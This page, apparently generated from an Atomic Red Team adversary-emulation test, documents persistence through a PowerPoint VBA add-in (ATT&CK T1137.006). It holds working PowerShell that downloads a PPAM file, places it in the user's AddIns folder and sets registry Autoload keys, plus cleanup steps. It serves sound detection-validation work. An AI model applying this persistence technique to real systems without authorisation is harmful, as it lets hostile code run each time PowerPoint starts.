---
atomic_guid: "f89e58f9-2b49-423b-ac95-1f3e7cfd8277"
title: "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.006"
attack_technique_name: "Office Application Startup: Add-ins"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "f89e58f9-2b49-423b-ac95-1f3e7cfd8277"
  - "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started
The sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup#^t1137006-add-ins|T1137.006: Add-ins]]

## Dependencies

Microsoft Excel must be installed

### Prerequisite Check

```untitled
try {
  New-Object -COMObject "PowerPoint.Application" | Out-Null
  Stop-Process -Name "PowerPnt"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "You will need to install Microsoft PowerPoint manually to meet this requirement"
```

PPAM file must exist on disk at specified location

### Prerequisite Check

```untitled
if (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam") {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"
```

## Executor

- name: powershell

### Command

```powershell
Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"
$ver = (New-Object -COMObject "PowerPoint.Application").version
$ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
New-Item -type Directory $ExcelRegPath -Force | Out-Null
New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null
New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null
Stop-Process -Name "PowerPnt" -ErrorAction Ignore
Start-Process "PowerPnt"
```

### Cleanup

```powershell
$ver = (New-Object -COMObject "PowerPoint.Application").version
Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore
Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore
Start-Sleep 3
Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml)
